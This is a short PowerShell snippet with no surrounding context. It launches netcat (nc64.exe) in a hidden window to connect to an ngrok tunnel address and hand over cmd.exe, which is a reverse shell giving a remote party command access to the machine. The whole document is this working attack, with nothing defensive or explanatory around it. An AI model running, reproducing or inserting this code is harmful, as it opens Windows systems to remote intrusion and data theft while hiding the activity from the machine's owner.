$command = ".\nc64.exe 0.tcp.eu.ngrok.io 18745 -e cmd.exe"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden
